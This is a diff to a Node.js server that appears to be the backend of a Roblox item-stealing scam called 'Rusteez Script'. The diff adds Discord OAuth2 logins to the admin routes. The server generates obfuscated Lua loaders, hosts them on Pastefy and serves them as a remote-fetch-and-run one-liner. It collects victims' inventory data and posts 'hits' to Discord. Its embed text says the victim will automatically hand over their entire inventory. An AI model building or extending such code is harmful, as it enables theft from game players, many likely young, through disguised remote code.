@@ -20,14 +20,135 @@ const UsersInfo = require('./models/Users'); // <-- import du modèle
 // --- CONFIGURATION ---
 const PORT = process.env.PORT || 3000;
 const MONGO_URI = process.env.MONGO_URI;
-const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN; // fallback optional
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const PASTEFY_KEY = process.env.PASTEFY_KEY;
+const OAUTH2_CLIENT_ID = process.env.OAUTH2_CLIENT_ID;
+const OAUTH2_CLIENT_SECRET = process.env.OAUTH2_CLIENT_SECRET;
+const OAUTH2_REDIRECT = process.env.OAUTH2_URL; // redirect URI registered in Discord app
+const FRONTEND_URL = process.env.FRONTEND_URL; // where to redirect after auth
+const LUA_OBF_KEY = process.env.LUA_OBF_KEY;
+const ADMIN_DISCORD_IDS = process.env.ADMIN_DISCORD_IDS || ''; // optional CSV of admin discord ids
 
 const pastefy = new PastefyClient(PASTEFY_KEY);
+
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 
+// In-memory sessions map: sessionToken -> { id, username, createdAt }
+const SESSIONS = new Map();
+
+// Helper: generate session token
+function generateSessionToken() {
+    return randomBytes(24).toString('hex');
+}
+
+// Helper: check if a session token (or admin token) is valid and returns user info
+function getAuthFromRequest(req) {
+    // 1) query ?token=
+    const qtoken = req.query && req.query.token;
+    // 2) header x-admin-token (legacy) or Authorization: Bearer <token>
+    const headerToken = req.headers['x-admin-token'] || (req.headers.authorization && req.headers.authorization.split(' ')[1]);
+
+    const token = qtoken || headerToken;
+    if (!token) return null;
+
+    // legacy ADMIN_TOKEN support
+    if (ADMIN_TOKEN && token === ADMIN_TOKEN) {
+        return { adminUsingLegacyToken: true };
+    }
+
+    const session = SESSIONS.get(String(token));
+    if (!session) return null;
+    return session;
+}
+
+// Optional admin check by Discord ID list
+function isDiscordAdmin(auth) {
+    if (!auth) return false;
+    if (auth.adminUsingLegacyToken) return true;
+    if (!auth.id) return false;
+    if (!ADMIN_DISCORD_IDS) return true; // if not configured, accept any authenticated discord user
+    const allowed = ADMIN_DISCORD_IDS.split(',').map(s => s.trim()).filter(Boolean);
+    return allowed.includes(String(auth.id));
+}
+
+/* ----------------- OAuth2 endpoints ----------------- */
+// Redirect to Discord OAuth2 authorize URL
+app.get('/auth/discord', (req, res) => {
+    if (!OAUTH2_CLIENT_ID || !OAUTH2_REDIRECT) {
+        return res.status(500).send('OAuth2 not configured on server.');
+    }
+    const params = new URLSearchParams({
+        client_id: OAUTH2_CLIENT_ID,
+        redirect_uri: OAUTH2_REDIRECT,
+        response_type: 'code',
+        scope: 'identify'
+    });
+    return res.redirect(`https://discord.com/api/oauth2/authorize?${params.toString()}`);
+});
+
+// Callback route Discord will call
+app.get('/auth/discord/callback', async (req, res) => {
+    const code = req.query.code;
+    if (!code) {
+        return res.status(400).send('Missing code');
+    }
+    if (!OAUTH2_CLIENT_ID || !OAUTH2_CLIENT_SECRET || !OAUTH2_REDIRECT) {
+        return res.status(500).send('OAuth2 not configured on server.');
+    }
+
+    try {
+        // Exchange code for token
+        const tokenResp = await axios.post('https://discord.com/api/oauth2/token',
+            new URLSearchParams({
+                client_id: OAUTH2_CLIENT_ID,
+                client_secret: OAUTH2_CLIENT_SECRET,
+                grant_type: 'authorization_code',
+                code: String(code),
+                redirect_uri: OAUTH2_REDIRECT,
+            }).toString(),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+
+        const tokenData = tokenResp.data;
+        if (!tokenData || !tokenData.access_token) {
+            log('[OAUTH] no access_token in response');
+            return res.status(500).send('OAuth token exchange failed.');
+        }
+
+        // Fetch user info
+        const meResp = await axios.get('https://discord.com/api/users/@me', {
+            headers: { Authorization: `Bearer ${tokenData.access_token}` }
+        });
+        const user = meResp.data;
+        if (!user || !user.id) {
+            log('[OAUTH] no user returned');
+            return res.status(500).send('Failed to fetch Discord user.');
+        }
+
+        // Create server session token
+        const sessionToken = generateSessionToken();
+        const sessionObj = { id: user.id, username: user.username, createdAt: new Date().toISOString() };
+        SESSIONS.set(sessionToken, sessionObj);
+
+        const redirectTarget = "https://m4gix-ws.onrender.com/";
+        try {
+            const redirectUrl = new URL(redirectTarget);
+            redirectUrl.searchParams.set('token', sessionToken);
+            return res.redirect(redirectUrl.toString());
+        } catch (err) {
+            // Si FRONTEND_URL est mal formée, retourner JSON pour debug
+            log(`⚠️ Invalid FRONTEND_URL, returning JSON instead: ${err.message}`);
+            return res.json({ success: true, token: sessionToken, user: sessionObj, redirect: redirectTarget });
+        }
+    } catch (err) {
+        log(`❌ [OAUTH] callback error: ${err && err.message ? err.message : err}`);
+        return res.status(500).send('OAuth callback error');
+    }
+});
+
+/* ----------------- Paste/obfuscate helpers (existing) ----------------- */
 
 async function uploadScript(script, scriptTitle, folder) {
     try {
@@ -48,16 +169,17 @@ async function uploadScript(script, scriptTitle, folder) {
     }
     return null;
 }
+
 async function obfuscateScript(luaCode) {
     try {
         log("🔍 [OBF] Step 1: Creating Session...");
 
         // ÉTAPE 1 : Créer la session avec le code source
-        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript', 
+        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript',
             luaCode, // Le code est envoyé directement comme texte
             {
                 headers: {
-                    'apikey': process.env.LUA_OBF_KEY,
+                    'apikey': LUA_OBF_KEY,
                     'content-type': 'text/plain' // La doc dit 'text'
                 }
             }
@@ -69,22 +191,22 @@ async function obfuscateScript(luaCode) {
         log(`🔍 [OBF] Step 2: Applying Obfuscation (Session: ${sessionId.substring(0, 8)}...)`);
 
         // ÉTAPE 2 : Appliquer les plugins d'obfuscation
-        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate', 
+        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate',
             {
                 "MinifiyAll": true,   // Dans le noeud racine
                 "Virtualize": true,   // Dans le noeud racine
                 "CustomPlugins": {
                     // Recommandé avant la virtualisation pour éviter les erreurs
-                    "RewriteToLua51": true, 
+                    "RewriteToLua51": true,
                     "EncryptStrings": [100],
                     "ControlFlowFlattenV1AllBlocks": [100],
                     "SwizzleLookups": [100],
                     "MutateAllLiterals": [100] // Très bien car sans impact sur les perfs
                 }
-            }, 
+            },
             {
                 headers: {
-                    'apikey': process.env.LUA_OBF_KEY,
+                    'apikey': LUA_OBF_KEY,
                     'sessionId': sessionId,
                     'content-type': 'application/json'
                 }
@@ -138,18 +260,18 @@ async function createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw
         `local var2 = loadstring(var1)`,
         `local var3 = var2()`
     ].join('\n');
-        
+
     const lua = await obfuscateScript(src);
     const paste = await uploadScript(lua, `${scriptId}.lua`, 'hfI1y3F8');
     return `loadstring(game:HttpGet("${paste.raw_url}"))()`;
 }
-// --- CONNEXION DB ---
+
+/* ----------------- DB connect + Discord bot (unchanged) ----------------- */
 mongoose.connect(MONGO_URI)
     .then(() => {
         log("✅ [DB] Connexion établie");
     })
     .catch(err => log(`❌ [DB] ERREUR : ${err}`));
-
 
 // --- BOT DISCORD ---
 const clientDiscord = new Client({
@@ -166,19 +288,22 @@ clientDiscord.once(Events.ClientReady, async () => {
 
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 
+/* ----------------- API routes ----------------- */
+// admin verify: accepts ?token= or Authorization Bearer <token>
 app.get('/api/admin/verify', (req, res) => {
-    res.json({ success: req.query.token === ADMIN_TOKEN });
+    const auth = getAuthFromRequest(req);
+    if (auth) {
+        return res.json({ success: true, user: auth });
+    }
+    return res.json({ success: false });
 });
 
+// create-script: only allowed for authenticated discord sessions (or legacy ADMIN_TOKEN)
 app.post('/api/create-script', async (req, res) => {
     try {
-        // Auth check if ADMIN_TOKEN is set
-        if (ADMIN_TOKEN) {
-            const tokenQuery = req.query.token;
-            const tokenHeader = req.headers['x-admin-token'];
-            if (tokenQuery !== ADMIN_TOKEN && tokenHeader !== ADMIN_TOKEN) {
-                return res.status(403).json({ success: false, message: 'Forbidden' });
-            }
+        const auth = getAuthFromRequest(req);
+        if (!auth || !isDiscordAdmin(auth)) {
+            return res.status(403).json({ success: false, message: 'Forbidden' });
         }
 
         const body = req.body || {};
@@ -188,8 +313,8 @@ app.post('/api/create-script', async (req, res) => {
         const webhookUrlRaw = body.webhookurl || '';
         const visualRaw = body.visual || '';
 
-        const loader = createScriptLoader(minIncome,maxItems,targetsRaw,webhookUrlRaw,visualRaw);
-        
+        const loader = await createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw);
+
         return res.status(201).json({ success: true, data: { Script: loader } });
     } catch (err) {
         log(`❌ [API] POST /api/create-script error: ${err && err.message ? err.message : err}`);
@@ -197,7 +322,6 @@ app.post('/api/create-script', async (req, res) => {
     }
 });
 
-// Route pour recevoir et persister les données envoyées par le script Lua
 app.post('/api/base-infos', async (req, res) => {
     try {
         const payload = req.body || {};
@@ -233,7 +357,7 @@ app.post('/api/base-infos', async (req, res) => {
         return res.status(500).json({ success: false, message: 'Internal server error' });
     }
 });
-// --- NOUVEL ENDPOINT: récupérer tous les Brainrots aplatis ---
+
 app.get('/api/base-infos', async (req, res) => {
     try {
         const docs = await BaseInfo.find({}).lean();
@@ -263,7 +387,6 @@ app.get('/api/base-infos', async (req, res) => {
 });
 
 app.post('/api/hit', async (req, res) => {
-    // IMPORTANT: toujours retourner 201 pour le client Lua, même en cas d'erreur.
     try {
         const payload = req.body || {};
 
@@ -319,50 +442,50 @@ async function PostHitOnWebHook(webHookUrl, hitInfo) {
     try {
         const webhookClient = new WebhookClient({ url: webHookUrl });
         const hitEmbed = new EmbedBuilder()
-                .setTitle("Rusteez Hit")
-                .setColor(0x2b2d31)
-                .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
-                .addFields(
-                    {
-                        name: "📄 Player Information",
-                        value: `\`\`\`properties\n🆔 Username     : ${hitInfo.Name}\n👑 Receiver     : ${Array.isArray(hitInfo.Targets) ? hitInfo.Targets.join(', ') : hitInfo.Targets}\n\`\`\``
-                    },
-                    {
-                        name: "🧠 Brainrots",
-                        value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0
-                            ? hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0)).map(br => {
-                                // 1. Préparation des éléments (Mutation + Traits)
-                                let extras = [];
+            .setTitle("Rusteez Hit")
+            .setColor(0x2b2d31)
+            .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
+            .addFields(
+                {
+                    name: "📄 Player Information",
+                    value: `\`\`\`properties\n🆔 Username     : ${hitInfo.Name}\n👑 Receiver     : ${Array.isArray(hitInfo.Targets) ? hitInfo.Targets.join(', ') : hitInfo.Targets}\n\`\`\``
+                },
+                {
+                    name: "🧠 Brainrots",
+                    value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0
+                        ? hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0)).map(br => {
+                            // 1. Préparation des éléments (Mutation + Traits)
+                            let extras = [];
 
-                                // On ajoute la mutation en premier si elle existe
-                                if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
-                                    extras.push(br.Mutation);
+                            // On ajoute la mutation en premier si elle existe
+                            if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
+                                extras.push(br.Mutation);
+                            }
+
+                            // On ajoute les traits (qu'ils soient déjà une string ou un array)
+                            if (br.Traits) {
+                                if (Array.isArray(br.Traits)) {
+                                    br.Traits.forEach(t => { if (t && t !== "") extras.push(t); });
+                                } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
+                                    extras.push(br.Traits);
                                 }
+                            }
 
-                                // On ajoute les traits (qu'ils soient déjà une string ou un array)
-                                if (br.Traits) {
-                                    if (Array.isArray(br.Traits)) {
-                                        br.Traits.forEach(t => { if (t && t !== "") extras.push(t); });
-                                    } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
-                                        extras.push(br.Traits);
-                                    }
-                                }
+                            // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
+                            const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
 
-                                // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
-                                const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
-
-                                // 3. Retour de la ligne formatée
-                                return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
-                            }).join('\n')
-                            : "None"}\n\`\`\``
-                    }
-                )
-                .setFooter({ text: `Rusteez Script` })
-                .setTimestamp();
+                            // 3. Retour de la ligne formatée
+                            return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
+                        }).join('\n')
+                        : "None"}\n\`\`\``
+                }
+            )
+            .setFooter({ text: `Rusteez Script` })
+            .setTimestamp();
         await webhookClient.send({
-                content: hitInfo.Name,
-                embeds: [hitEmbed]
-            });
+            content: hitInfo.Name,
+            embeds: [hitEmbed]
+        });
     } catch (err) {
         log(`⚠️ Forward Webhook Error: ${err.message}`);
     }
